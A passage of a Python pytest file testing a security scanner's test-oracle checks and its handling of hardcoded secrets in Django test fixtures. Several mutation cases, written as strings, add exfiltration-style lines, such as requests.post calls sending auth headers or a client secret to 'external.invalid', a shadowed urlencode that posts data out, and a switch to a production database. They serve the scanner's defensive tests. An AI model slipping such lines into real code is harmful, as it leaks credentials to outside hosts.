from __future__ import annotations

import ast
import hashlib

from factoryline.mock_fixture_provenance import (
    django_test_secret_evidence,
    django_test_secret_index,
)
from factoryline.review_audits import security_scan
import pytest


def _write(tmp_path, relative, source):
    path = tmp_path / relative
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(source, encoding="utf-8")


def _codes(report):
    return [finding["code"] for finding in report["findings"]]


def test_magicmock_annotation_without_fixture_is_unknown(tmp_path):
    _write(
        tmp_path,
        "test_case.py",
        "from unittest.mock import MagicMock\n"
        "def exercise(module): module.write('x')\n"
        "def test_write(module: MagicMock):\n"
        "    exercise(module)\n"
        "    module.write.assert_called_once_with('x')\n",
    )
    report = security_scan(tmp_path, cache_enabled=False)
    assert "QUALITY_UNKNOWN_TEST_ORACLE" in _codes(report)
    assert "QUALITY_HOLLOW_TEST" not in _codes(report)


def test_nearest_conftest_fixture_proves_nested_magicmock_assertion(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\nfrom unittest.mock import MagicMock\n"
        "@pytest.fixture\ndef mocked_module(): return MagicMock()\n",
    )
    _write(
        tmp_path,
        "sub/test_case.py",
        "def exercise(module): module.child.write('x')\n"
        "def test_write(mocked_module):\n"
        "    exercise(mocked_module)\n"
        "    mocked_module.child.write.assert_called_once_with('x')\n",
    )
    report = security_scan(tmp_path, cache_enabled=False)
    assert report["finding_counts"] == {}


def test_local_noop_fixture_shadows_conftest_mock_and_stays_unknown(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\nfrom unittest.mock import MagicMock\n"
        "@pytest.fixture\ndef module(): return MagicMock()\n",
    )
    _write(
        tmp_path,
        "sub/test_case.py",
        "import pytest\nfrom unittest.mock import MagicMock\n"
        "class NoOp:\n"
        "    def write(self, value): pass\n"
        "    def assert_called_once_with(self, value): pass\n"
        "@pytest.fixture\ndef module(): return NoOp()\n"
        "def exercise(value): value.write('x')\n"
        "def test_write(module: MagicMock):\n"
        "    exercise(module)\n"
        "    module.assert_called_once_with('x')\n",
    )
    report = security_scan(tmp_path, cache_enabled=False)
    finding = next(
        item
        for item in report["findings"]
        if item["code"] == "QUALITY_WEAK_TEST_ORACLE"
    )
    assert finding["severity"] == "MEDIUM"
    assert finding["facts"]["whole_test_oracle"] == "UNASSESSED"


def test_nearest_noop_conftest_does_not_inherit_parent_mock_credit(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\nfrom unittest.mock import MagicMock\n"
        "@pytest.fixture\ndef module(): return MagicMock()\n",
    )
    _write(
        tmp_path,
        "sub/conftest.py",
        "import pytest\n"
        "class NoOp:\n"
        "    def write(self, value): pass\n"
        "    def assert_called_once_with(self, value): pass\n"
        "@pytest.fixture\ndef module(): return NoOp()\n",
    )
    _write(
        tmp_path,
        "sub/test_case.py",
        "from unittest.mock import MagicMock\n"
        "def exercise(value): value.write('x')\n"
        "def test_write(module: MagicMock):\n"
        "    exercise(module)\n"
        "    module.assert_called_once_with('x')\n",
    )
    report = security_scan(tmp_path, cache_enabled=False)
    finding = next(
        item
        for item in report["findings"]
        if item["code"] == "QUALITY_WEAK_TEST_ORACLE"
    )
    assert finding["severity"] == "MEDIUM"
    assert finding["facts"]["whole_test_oracle"] == "UNASSESSED"


def test_rebound_mock_provider_does_not_prove_fixture(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\nfrom unittest.mock import MagicMock as MockValue\n"
        "MockValue = NoOp\n"
        "@pytest.fixture\ndef module(): return MockValue()\n",
    )
    _write(
        tmp_path,
        "test_case.py",
        "from unittest.mock import MagicMock\n"
        "def test_write(module: MagicMock):\n"
        "    module.write.assert_called_once_with('x')\n",
    )
    codes = _codes(security_scan(tmp_path, cache_enabled=False))
    assert "QUALITY_UNKNOWN_TEST_ORACLE" in codes
    assert "QUALITY_HOLLOW_TEST" not in codes


def test_fixture_name_override_does_not_credit_function_name_parameter(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\nfrom unittest.mock import MagicMock\n"
        "@pytest.fixture(name='other')\ndef mocked_module(): return MagicMock()\n",
    )
    _write(
        tmp_path,
        "test_case.py",
        "from unittest.mock import MagicMock\n"
        "def test_write(mocked_module: MagicMock):\n"
        "    mocked_module.write.assert_called_once_with('x')\n",
    )
    assert "QUALITY_UNKNOWN_TEST_ORACLE" in _codes(
        security_scan(tmp_path, cache_enabled=False)
    )


def test_nearest_renamed_fixture_invalidates_parent_mock_credit(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\nfrom unittest.mock import MagicMock\n"
        "@pytest.fixture\ndef mocked_module(): return MagicMock()\n",
    )
    _write(
        tmp_path,
        "sub/conftest.py",
        "import pytest\nclass NoOp:\n"
        "    def __getattr__(self, name): return self\n"
        "    def __call__(self, *args): pass\n"
        "@pytest.fixture(name='mocked_module')\ndef other(): return NoOp()\n",
    )
    _write(
        tmp_path,
        "sub/test_case.py",
        "def exercise(module): module.write('x')\n"
        "def test_write(mocked_module):\n    exercise(mocked_module)\n"
        "    mocked_module.write.assert_called_once_with('wrong')\n",
    )
    assert "QUALITY_UNKNOWN_TEST_ORACLE" in _codes(
        security_scan(tmp_path, cache_enabled=False)
    )


def test_mock_constructor_attribute_override_does_not_prove_child_mock(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\nfrom unittest.mock import MagicMock\n"
        "class NoOp:\n    def __call__(self, value): pass\n"
        "    def assert_called_once_with(self, value): pass\n"
        "@pytest.fixture\ndef mocked_module(): return MagicMock(write=NoOp())\n",
    )
    _write(
        tmp_path,
        "test_case.py",
        "def exercise(module): module.write('x')\n"
        "def test_write(mocked_module):\n    exercise(mocked_module)\n"
        "    mocked_module.write.assert_called_once_with('wrong')\n",
    )
    assert "QUALITY_UNKNOWN_TEST_ORACLE" in _codes(
        security_scan(tmp_path, cache_enabled=False)
    )


def test_fixture_parameter_shadowing_mock_constructor_stays_unknown(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\nfrom unittest.mock import MagicMock\n"
        "class NoOp:\n    def __getattr__(self, name): return self\n"
        "    def __call__(self, *args): pass\n"
        "@pytest.fixture\ndef mocked_module(MagicMock=lambda: NoOp()):\n"
        "    return MagicMock()\n",
    )
    _write(
        tmp_path,
        "test_case.py",
        "def exercise(module): module.write('x')\n"
        "def test_write(mocked_module):\n    exercise(mocked_module)\n"
        "    mocked_module.write.assert_called_once_with('wrong')\n",
    )
    assert "QUALITY_UNKNOWN_TEST_ORACLE" in _codes(
        security_scan(tmp_path, cache_enabled=False)
    )


def test_decorated_noop_class_is_not_proven_inert(tmp_path):
    _write(
        tmp_path,
        "conftest.py",
        "import pytest\n"
        "def add_real_assertion(cls):\n"
        "    cls.assert_called_once_with = lambda self, value: None\n"
        "    return cls\n@add_real_assertion\nclass NoOp:\n"
        "    def assert_called_once_with(self, value): pass\n"
        "@pytest.fixture\ndef mocked_module(): return NoOp()\n",
    )
    _write(
        tmp_path,
        "test_case.py",
        "def test_write(mocked_module):\n"
        "    mocked_module.assert_called_once_with('wrong')\n",
    )
    codes = _codes(security_scan(tmp_path, cache_enabled=False))
    assert "QUALITY_WEAK_TEST_ORACLE" not in codes


_MODEL = """from django.db import models
from django.apps import apps
from django.contrib.auth.hashers import identify_hasher, make_password
from sample.settings import config
import logging
logger = logging.getLogger(__name__)
class SecretField(models.CharField):
    def pre_save(self, model_instance, add):
        secret = getattr(model_instance, self.attname)
        if not getattr(model_instance, 'hash_client_secret', True):
            return super().pre_save(model_instance, add)
        try:
            hasher = identify_hasher(secret)
            logger.debug(f'{model_instance}: {self.attname} uses {hasher}')
        except ValueError:
            logger.debug(f'{model_instance}: {self.attname} needs hashing')
            hashed_secret = make_password(secret, hasher=config.CLIENT_SECRET_HASHER)
            setattr(model_instance, self.attname, hashed_secret)
            return hashed_secret
        return super().pre_save(model_instance, add)
class Record(models.Model):
    client_secret = SecretField()
    def __str__(self): return self.name or self.client_id
class RecordManager(models.Manager):
    pass
class ClientApplication(Record):
    objects = RecordManager()
def select_model():
    return apps.get_model(config.APPLICATION_MODEL)
"""


_FORM = """from urllib.parse import urlencode
MEDIA_TYPE = 'application/x-www-form-urlencoded'
def submit_form(client, path, data=None, **extra):
    extra.setdefault('CONTENT_TYPE', MEDIA_TYPE)
    return client.post(path, data=urlencode(data or {}, doseq=True), content_type=MEDIA_TYPE, **extra)
"""


_TEST = """import pytest
from sample.models import select_model
from tests.helpers import submit_form
@pytest.mark.django_db
def test_login(client):
    Application = select_model()
    client_secret = 'owned-fixture-58a92'
    app = Application.objects.create(client_secret=client_secret)
    response = submit_form(client, '/token', {'client_secret': client_secret})
    assert response.status_code == 200
"""


_CLASS_TEST = """from django.test import TestCase
from sample.models import select_model
from tests.helpers import basic_header, submit_form
Application = select_model()
client_secret = 'owned-fixture-58a92'
class LocalTests(TestCase):
    @classmethod
    def setUpTestData(cls):
        cls.application = Application.objects.create(client_secret=client_secret)
    def test_login(self):
        headers = basic_header('account', client_secret)
        response = submit_form(self.client, '/token', {}, **headers)
        assert response.status_code == 200
"""


_HEADER = """
import base64
def basic_header(user, password):
    user_pass = '{0}:{1}'.format(user, password)
    auth_string = base64.b64encode(user_pass.encode('utf-8'))
    auth_headers = {'HTTP_AUTHORIZATION': 'Basic ' + auth_string.decode('utf-8')}
    return auth_headers
"""


def _fixture_project(root, test_source=_TEST, model_source=_MODEL, helper_source=_FORM):
    sources = {
        "pyproject.toml": "[project.optional-dependencies]\ntest=['pytest>=8','pytest-django>=4']\n",
        "tox.ini": "[testenv]\ncommands=pytest {posargs}\nsetenv=\n DJANGO_SETTINGS_MODULE=tests.settings\n",
        "tests/settings.py": "DATABASES={'default':{'ENGINE':'django.db.backends.sqlite3','NAME':':memory:'}}\nAPP_MODEL='sample.ClientApplication'\n",
        "sample/settings.py": "from django.conf import settings\nAPPLICATION_MODEL=getattr(settings,'APP_MODEL','sample.ClientApplication')\nconfig=object()\n",
        "sample/models.py": model_source,
        "tests/helpers.py": helper_source,
        "tests/test_auth.py": test_source,
    }
    for name, text in sources.items():
        _write(root, name, text)


@pytest.mark.parametrize(
    "before,after",
    [
        (
            "Application = select_model()",
            "Application = select_model()\n    Application = EvilModel",
        ),
        ("client_secret =", "client = External()\n    client_secret ="),
        ("client_secret=client_secret)", "client_secret=leak(client_secret))"),
        ("{'client_secret': client_secret}", "{'client_secret': leak(client_secret)}"),
        ("def test_login(client):", "def test_login(client=External()):"),
        ("def test_login(client):", "def test_login(client, select_model):"),
    ],
)
def test_django_fixture_unresolved_provider_or_nested_escape_stays_active(
    tmp_path, before, after
):
    assert before in _TEST
    _fixture_project(tmp_path, test_source=_TEST.replace(before, after))
    _assert_fixture_credential_active(tmp_path)


@pytest.mark.parametrize(
    "extra",
    [
        "logger.debug(secret)",
        "logger.debug(model_instance.client_secret)",
        "setattr(logger, 'exposed', secret)",
        "exposed = secret\n        logger.debug(exposed)",
        "setattr = logger.debug",
        "make_password = logger.debug",
    ],
)
def test_django_field_effect_rejects_exports_and_provider_mutation(tmp_path, extra):
    anchor = "        secret = getattr(model_instance, self.attname)"
    source = _MODEL.replace(anchor, anchor + "\n        " + extra)
    _fixture_project(tmp_path, model_source=source)
    _assert_fixture_credential_active(tmp_path)


def test_django_fixture_nearer_renamed_client_override_stays_active(tmp_path):
    _fixture_project(tmp_path)
    _write(
        tmp_path,
        "tests/conftest.py",
        "import pytest\n@pytest.fixture(name='client')\ndef remote(): return External()\n",
    )
    _assert_fixture_credential_active(tmp_path)


@pytest.mark.parametrize(
    "before,after",
    [
        (
            "headers = basic_header('account', client_secret)",
            "headers = basic_header('account', client_secret)\n        requests.post('https://external.invalid', headers=headers)",
        ),
        ("**headers)", "**leak(headers))"),
        (
            "class LocalTests(TestCase):",
            "Application = EvilModel\nclass LocalTests(TestCase):",
        ),
        (
            "class LocalTests(TestCase):",
            "Application.objects.create = leak\nclass LocalTests(TestCase):",
        ),
        (
            "def setUpTestData(cls):",
            "def setUpTestData(cls):\n        Application = EvilModel",
        ),
        (
            "class LocalTests(TestCase):",
            "class LocalTests(TestCase):\n    client_class = External",
        ),
        (
            "def test_login(self):",
            "def test_login(self):\n        self.client = External()",
        ),
        (
            "Application.objects.create(client_secret=client_secret)",
            "opaque(Application).objects.create(client_secret=client_secret)",
        ),
    ],
)
def test_django_class_fixture_derived_exports_and_provider_replacement_stay_active(
    tmp_path, before, after
):
    assert before in _CLASS_TEST
    _fixture_project(
        tmp_path,
        test_source=_CLASS_TEST.replace(before, after),
        helper_source=_FORM + _HEADER,
    )
    _assert_fixture_credential_active(tmp_path)


def _assert_fixture_credential_active(root):
    report = security_scan(root, cache_enabled=False)
    findings = [
        finding
        for finding in report["findings"]
        if finding["path"] == "tests/test_auth.py"
        and finding["code"] == "SECURITY_HARDCODED_SECRET"
    ]
    assert len(findings) == 1
    assert findings[0]["severity"] == "CRITICAL"


_authority128_MODEL = """from django.db import models
from django.apps import apps
from .settings import oauth2_settings
class SecretField(models.CharField):
    pass
class Record(models.Model):
    client_secret = SecretField()
class RecordManager(models.Manager):
    pass
class ClientApplication(Record):
    objects = RecordManager()
def get_application_model():
    return apps.get_model(oauth2_settings.APPLICATION_MODEL)
"""


_authority128_FORM = """from urllib.parse import urlencode
def post_form(client, path, data=None, **extra):
    return client.post(path, data=urlencode(data or {}, doseq=True), **extra)
"""


_authority128_TEST = """import pytest
from sample.models import get_application_model
from tests.helpers import post_form as request_token
@pytest.mark.django_db
def test_login(client):
    Application = get_application_model()
    client_secret = "owned-fixture-58a92"
    app = Application.objects.create(client_secret=client_secret)
    return request_token(client, "/token", {"client_secret": client_secret})
"""


def _authority128_fixture_project(
    root,
    test_source=_authority128_TEST,
    model_source=_authority128_MODEL,
    helper_source=_authority128_FORM,
):
    sources = {
        "pyproject.toml": "[project.optional-dependencies]\ntest=['pytest>=8','pytest-django>=4']\n",
        "tox.ini": "[testenv]\ncommands=pytest {posargs}\nextras=test\nsetenv=\n DJANGO_SETTINGS_MODULE=tests.settings\n",
        "tests/settings.py": "DATABASES={'default':{'ENGINE':'django.db.backends.sqlite3','NAME':':memory:'}}\nINSTALLED_APPS=('sample',)\nOAUTH2_PROVIDER_APPLICATION_MODEL='sample.ClientApplication'\n",
        "sample/settings.py": "from django.conf import settings\nAPPLICATION_MODEL=getattr(settings,'OAUTH2_PROVIDER_APPLICATION_MODEL','sample.ClientApplication')\nDEFAULTS={'APPLICATION_MODEL':APPLICATION_MODEL}\nUSER_SETTINGS=getattr(settings,'OAUTH2_PROVIDER',None)\nclass Settings:\n    def __init__(self,user_settings=None,defaults=None):\n        self.user_settings=user_settings or {}\n        self.defaults=defaults or DEFAULTS\n    def __getattr__(self,attr):\n        return self.user_settings.get(attr,self.defaults[attr])\noauth2_settings=Settings(USER_SETTINGS,DEFAULTS)\n",
        "sample/models.py": model_source,
        "tests/helpers.py": helper_source,
        "tests/test_auth.py": test_source,
    }
    for name, text in sources.items():
        _write(root, name, text)


def _captured_fixture_evidence(root, value="owned-fixture-58a92"):
    modules, source_bytes, inventory = {}, {}, {}
    for path in root.rglob("*.py"):
        raw = path.read_bytes()
        tree = ast.parse(raw)
        digest = hashlib.sha256(raw).hexdigest()
        tree._oracle_source_sha256 = digest
        modules[path], source_bytes[path], inventory[path] = tree, raw, digest
    configs = {
        name: (root / name).read_bytes() for name in ("pyproject.toml", "tox.ini")
    }
    index = django_test_secret_index(
        root, modules, configs, source_bytes=source_bytes, inventory=inventory
    )
    path = root / "tests/test_auth.py"
    literals = [
        node
        for node in ast.walk(modules[path])
        if isinstance(node, ast.Constant) and node.value == value
    ]
    assert len(literals) == 1
    return django_test_secret_evidence(index, path, literals[0].lineno, value)


def test_django_fixture_requires_captured_bytes_and_resolves_local_authority(tmp_path):
    _authority128_fixture_project(tmp_path)
    evidence = _captured_fixture_evidence(tmp_path)
    assert evidence["eligible"] is True
    assert evidence["classification"] == "TEST_OWNED_LOCAL_FIXTURE"
    assert evidence["transport"]["exclusivity"] == "UNASSESSED"
    assert "owned-fixture-58a92" not in repr(evidence)
    assert evidence["source_sha256"]
    assert evidence["inventory_sha256"]


def test_django_fixture_allows_only_source_bound_literal_model_projections(tmp_path):
    model = _authority128_MODEL.replace(
        "class ClientApplication(Record):\n    objects = RecordManager()",
        "class ClientApplication(Record):\n"
        "    CLIENT_CONFIDENTIAL = 'confidential'\n"
        "    objects = RecordManager()",
    )
    test_source = _authority128_TEST.replace(
        "    return request_token",
        "    grant_type = Application.CLIENT_CONFIDENTIAL\n    return request_token",
    )
    _authority128_fixture_project(tmp_path, test_source=test_source, model_source=model)
    assert _captured_fixture_evidence(tmp_path)["eligible"] is True


@pytest.mark.parametrize(
    "test_source",
    [
        _authority128_TEST.replace(
            'client_secret = "owned-fixture-58a92"',
            'client_secret = "owned-fixture-58a92"\n    client_secret = external()',
        ),
        _authority128_TEST.replace(
            "client_secret=client_secret", "client_secret=external(client_secret)"
        ),
        _authority128_TEST.replace(
            '{"client_secret": client_secret}',
            '{"client_secret": external(client_secret)}',
        ),
        _authority128_TEST.replace(
            "    app = Application.objects.create",
            "    mutate(Application)\n    app = Application.objects.create",
        ),
        _authority128_TEST.replace(
            "    return request_token", "    mutate(client)\n    return request_token"
        ),
        _authority128_TEST.replace(
            "@pytest.mark.django_db",
            "@pytest.mark.django_db\n@settings_override({'OAUTH2_PROVIDER_APPLICATION_MODEL': 'other.App'})",
        ),
    ],
)
def test_django_fixture_reassignment_or_unresolved_authority_stays_active(
    tmp_path, test_source
):
    _authority128_fixture_project(tmp_path, test_source=test_source)
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False


def test_django_fixture_class_and_module_literals_are_out_of_scope(tmp_path):
    _authority128_fixture_project(
        tmp_path, test_source="secret = 'owned-fixture-58a92'\n"
    )
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False
    _authority128_fixture_project(
        tmp_path, test_source="class Tests:\n    secret = 'owned-fixture-58a92'\n"
    )
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False


def test_django_fixture_rejects_custom_manager_and_production_database(tmp_path):
    _authority128_fixture_project(
        tmp_path,
        model_source=_authority128_MODEL.replace(
            "class RecordManager(models.Manager):\n    pass",
            "class RecordManager(models.Manager):\n    def create(self, **kwargs): return External(**kwargs)",
        ),
    )
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False


def test_django_fixture_rejects_multiple_model_bases(tmp_path):
    _authority128_fixture_project(
        tmp_path,
        model_source=_authority128_MODEL.replace(
            "class ClientApplication(Record):",
            "class ApplicationMixin: pass\nclass ClientApplication(ApplicationMixin, Record):",
        ),
    )
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False


def test_django_fixture_rejects_provider_and_import_shadowing(tmp_path):
    _authority128_fixture_project(tmp_path)
    path = tmp_path / "sample/settings.py"
    path.write_text(path.read_text() + "\ngetattr = external_getattr\n")
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False

    _authority128_fixture_project(tmp_path)
    path = tmp_path / "sample/models.py"
    path.write_text(path.read_text() + "\napps = external_apps\n")
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False

    _authority128_fixture_project(tmp_path)
    path = tmp_path / "tests/helpers.py"
    path.write_text(path.read_text() + "\nurlencode = external_urlencode\n")
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False


def test_django_fixture_rejects_test_database_subscript_mutation(tmp_path):
    source = _authority128_TEST.replace(
        '    client_secret = "owned-fixture-58a92"',
        "    client_secret = \"owned-fixture-58a92\"\n    settings.DATABASES['default']['NAME'] = 'production.sqlite3'",
    ).replace("import pytest", "import pytest\nfrom django.conf import settings")
    _authority128_fixture_project(tmp_path, test_source=source)
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False


def test_django_fixture_rejects_registered_plugins_and_plugin_option(tmp_path):
    _authority128_fixture_project(tmp_path)
    _write(tmp_path, "tests/conftest.py", "pytest_plugins = ['remote_client_plugin']\n")
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False

    _authority128_fixture_project(tmp_path)
    path = tmp_path / "pyproject.toml"
    path.write_text(
        path.read_text()
        + "\n[tool.pytest.ini_options]\naddopts='-p remote_client_plugin'\n"
    )
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False


@pytest.mark.parametrize(
    "mutations",
    [
        pytest.param(
            {
                "tests/test_auth.py": _authority128_TEST
                + "\n@pytest.fixture(name='client')\ndef remote_client(): return External()\n"
            },
            id="test-module-client-fixture-override",
        ),
        pytest.param(
            {
                "tests/test_auth.py": _authority128_TEST.replace(
                    "def test_login(client):",
                    "def test_login(client, get_application_model):",
                )
            },
            id="factory-name-shadowed-by-parameter",
        ),
        pytest.param(
            {
                "tests/test_auth.py": _authority128_TEST.replace(
                    "    return request_token",
                    "    request_token = External()\n    return request_token",
                )
            },
            id="form-helper-local-rebinding",
        ),
        pytest.param(
            {
                "tests/test_auth.py": _authority128_TEST.replace(
                    "    app = Application.objects.create",
                    "    Application.objects.create = external_create\n"
                    "    app = Application.objects.create",
                )
            },
            id="nested-manager-method-replacement",
        ),
        pytest.param(
            {
                "sample/models.py": _authority128_MODEL.replace(
                    "class RecordManager(models.Manager):\n    pass",
                    "class RecordManager(models.Manager):\n"
                    "    def get_queryset(self): return ExternalQuerySet()",
                )
            },
            id="manager-effective-queryset-override",
        ),
        pytest.param(
            {
                "sample/models.py": _authority128_MODEL.replace(
                    "class SecretField(models.CharField):\n    pass",
                    "class SecretField(models.CharField):\n"
                    "    def __getattribute__(self, name): return external(name)\n"
                    "    pass",
                )
            },
            id="field-effective-getattribute-override",
        ),
        pytest.param(
            {
                "sample/models.py": _authority128_MODEL.replace(
                    "class ClientApplication(Record):\n    objects = RecordManager()",
                    "class ClientApplication(Record):\n"
                    "    save = external_save\n    objects = RecordManager()",
                )
            },
            id="model-save-class-assignment-override",
        ),
        pytest.param(
            {
                "sample/models.py": _authority128_MODEL
                + "\ngetattr = external_getattr\n"
            },
            id="model-module-builtin-rebinding",
        ),
        pytest.param(
            {
                "tests/settings.py": (
                    "DATABASES={'default':{'ENGINE':'django.db.backends.sqlite3','NAME':':memory:'}}\n"
                    "INSTALLED_APPS=('sample',)\n"
                    "OAUTH2_PROVIDER_APPLICATION_MODEL='sample.ClientApplication'\n"
                    "DATABASES['default'].update(NAME='production.sqlite3')\n"
                )
            },
            id="database-config-dict-update",
        ),
        pytest.param(
            {
                "django/__init__.py": "",
                "django/test.py": "import requests\nclass TestCase: client=requests.Session()\n",
            },
            id="canonical-django-provider-root-shadow",
        ),
        pytest.param(
            {
                "urllib/__init__.py": "",
                "urllib/parse.py": "import requests\ndef urlencode(data,**kw):\n    requests.post('https://external.invalid',data=data)\n    return ''\n",
            },
            id="canonical-urllib-provider-root-shadow",
        ),
        pytest.param(
            {
                "tests/test_auth.py": _authority128_TEST.replace(
                    "    app = Application.objects.create(client_secret=client_secret)",
                    "    mutate(Application); app = Application.objects.create(client_secret=client_secret)",
                )
            },
            id="same-line-provider-mutation-before-create",
        ),
        pytest.param(
            {
                "tests/test_auth.py": _authority128_TEST.replace(
                    "    app = Application.objects.create",
                    "    manager_alias = Application.objects\n"
                    "    manager_alias.create = external_create\n"
                    "    app = Application.objects.create",
                )
            },
            id="manager-alias-replacement-before-create",
        ),
        pytest.param(
            {
                "tests/test_auth.py": _authority128_TEST.replace(
                    "    app = Application.objects.create",
                    "    selected_writer = Application.objects.db_manager('default').create\n"
                    "    selected_writer = external_create\n"
                    "    app = Application.objects.create",
                )
            },
            id="renamed-nested-capability-projection",
        ),
    ],
)
def test_authority_review126_reproducers_stay_unproven(tmp_path, mutations):
    _authority128_fixture_project(tmp_path)
    for relative, source in mutations.items():
        _write(tmp_path, relative, source)
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False
    _authority128_fixture_project(tmp_path)
    path = tmp_path / "tests/settings.py"
    path.write_text(path.read_text().replace(":memory:", "production.sqlite3"))
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False


def test_django_fixture_rejects_reachable_model_signal_registration(tmp_path):
    _authority128_fixture_project(tmp_path)
    _write(
        tmp_path,
        "sample/apps.py",
        "from django.apps import AppConfig\n"
        "class SampleConfig(AppConfig):\n"
        "    name = 'sample'\n"
        "    def ready(self):\n"
        "        from . import signals\n",
    )
    _write(
        tmp_path,
        "sample/signals.py",
        "from django.db.models.signals import pre_save\n"
        "def callback(sender, instance, **kwargs): pass\n"
        "pre_save.connect(callback, sender='sample.ClientApplication')\n",
    )
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False

    _authority128_fixture_project(tmp_path)
    _write(
        tmp_path,
        "tests/conftest.py",
        "from django.db.models.signals import pre_save\n"
        "pre_save.connect(external_callback)\n",
    )
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False


def test_django_fixture_rejects_registered_signal_callable_alias(tmp_path):
    _authority128_fixture_project(tmp_path)
    path = tmp_path / "sample/models.py"
    path.write_text(
        path.read_text() + "\nfrom django.db.models.signals import pre_save\n"
        "def callback(sender,instance,**kwargs):\n"
        "    instance.client_secret=external_credential()\n"
        "register = pre_save.connect\n"
        "register(callback,sender=ClientApplication,weak=False)\n"
    )
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False


def test_django_fixture_rejects_nearer_client_override_and_stale_capture(tmp_path):
    _authority128_fixture_project(tmp_path)
    _write(
        tmp_path,
        "tests/conftest.py",
        "import pytest\n@pytest.fixture(name='client')\ndef remote(): return External()\n",
    )
    assert _captured_fixture_evidence(tmp_path)["eligible"] is False
    _authority128_fixture_project(tmp_path)
    modules, source_bytes, inventory = {}, {}, {}
    for path in tmp_path.rglob("*.py"):
        raw = path.read_bytes()
        tree = ast.parse(raw)
        digest = hashlib.sha256(raw).hexdigest()
        tree._oracle_source_sha256 = digest
        modules[path], source_bytes[path], inventory[path] = tree, raw, digest
    configs = {
        name: (tmp_path / name).read_bytes() for name in ("pyproject.toml", "tox.ini")
    }
    index = django_test_secret_index(
        tmp_path, modules, configs, source_bytes=source_bytes, inventory=inventory
    )
    path = tmp_path / "tests/test_auth.py"
    source_bytes[path] = b"def changed(): pass\n"
    assert (
        django_test_secret_evidence(index, path, 6, "owned-fixture-58a92")["eligible"]
        is False
    )


def test_django_external_transport_is_not_misreported_as_role_guard(tmp_path):
    source = _authority128_TEST.replace(
        '    return request_token(client, "/token", {"client_secret": client_secret})',
        '    requests.post("https://external.invalid", data=client_secret)\n    return request_token(client, "/token", {"client_secret": client_secret})',
    )
    _authority128_fixture_project(tmp_path, test_source=source)
    evidence = _captured_fixture_evidence(tmp_path)
    assert evidence["eligible"] is True
    assert evidence["transport"]["exclusivity"] == "UNASSESSED"
    assert "network_consumer_guard" not in evidence


def test_django_fixture_scanner_cold_warm_and_config_drift(tmp_path):
    _authority128_fixture_project(tmp_path)
    for _ in range(2):
        report = security_scan(tmp_path)
        assert not [
            f
            for f in report["findings"]
            if f["code"] == "SECURITY_HARDCODED_SECRET"
            and f["path"] == "tests/test_auth.py"
        ]
        observed = [
            f
            for f in report.get("primitive_observations", [])
            if f["path"] == "tests/test_auth.py"
        ]
        assert len(observed) == 1
        assert observed[0]["severity"] == "CRITICAL"
        assert observed[0]["facts"]["disposition"] == "TEST_OWNED_LOCAL_FIXTURE"
    path = tmp_path / "tests/settings.py"
    path.write_text(path.read_text().replace(":memory:", "production.sqlite3"))
    report = security_scan(tmp_path)
    active = [
        f
        for f in report["findings"]
        if f["code"] == "SECURITY_HARDCODED_SECRET"
        and f["path"] == "tests/test_auth.py"
    ]
    assert len(active) == 1 and active[0]["severity"] == "CRITICAL"


_APP133_DRF = """import base64
from rest_framework import HTTP_HEADER_ENCODING
from rest_framework.test import APITestCase
from django.contrib.auth.models import User

class LoginCheck(APITestCase):
    def test_login(self):
        username = "created-user"
        password = "fictionalvalue"
        User.objects.create_user(username=username, password=password)
        credentials = f"{username}:{password}"
        encoded = base64.b64encode(credentials.encode(HTTP_HEADER_ENCODING)).decode(HTTP_HEADER_ENCODING)
        self.client.credentials(HTTP_AUTHORIZATION=f"Basic {encoded}")
        response = self.client.post("/session")
        self.assertEqual(response.status_code, 200)
"""


def _app133_drf_projection(tmp_path, text, *, corrupt_source=False):
    from factoryline.mock_fixture_provenance import (
        application_test_index,
        application_test_secret_evidence,
    )

    path = tmp_path / "checks" / "login.py"
    raw = text.encode()
    tree = ast.parse(raw)
    tree._oracle_source_sha256 = hashlib.sha256(raw).hexdigest()
    modules, sources, inventory = (
        {path: tree},
        {path: raw},
        {path: tree._oracle_source_sha256},
    )
    if corrupt_source:
        sources[path] += b"\n# stale capture"
    index = application_test_index(tmp_path, modules, sources, inventory)
    assignment = next(
        node
        for node in ast.walk(tree)
        if isinstance(node, ast.Assign)
        and len(node.targets) == 1
        and isinstance(node.targets[0], ast.Name)
        and node.targets[0].id == "password"
    )
    return application_test_secret_evidence(
        index, path, assignment.value.lineno, assignment.value.value
    )


def test_application133_credential_role_uses_authority_not_filename(tmp_path):
    evidence = _app133_drf_projection(tmp_path, _APP133_DRF)
    assert evidence["eligible"] is True
    assert evidence["consumer_use_closure"]["complete"] is True
    assert evidence["consumer_use_closure"]["uses"]
    assert evidence["runtime_assurance"] == "INCOMPLETE"
    assert evidence["transport_role"] == "UNASSESSED"
    assert evidence["target_execution"] == "not_performed"
    assert evidence["witness_sources"]




def _app_plaintext_roundtrip_projection(
    tmp_path, test_body, provider_rewrite=None, test_rewrite=None, return_index=False
):
    from factoryline.mock_fixture_provenance import (
        application_test_index,
        application_test_secret_evidence,
    )

    codec_source = (
        "from cryptography.hazmat.primitives.ciphers.aead import AESGCM\n"
        "class Codec:\n"
        "    def __init__(self, key):\n"
        "        self._cipher = AESGCM(key)\n"
        "    def encrypt(self, data):\n"
        "        if data is None:\n"
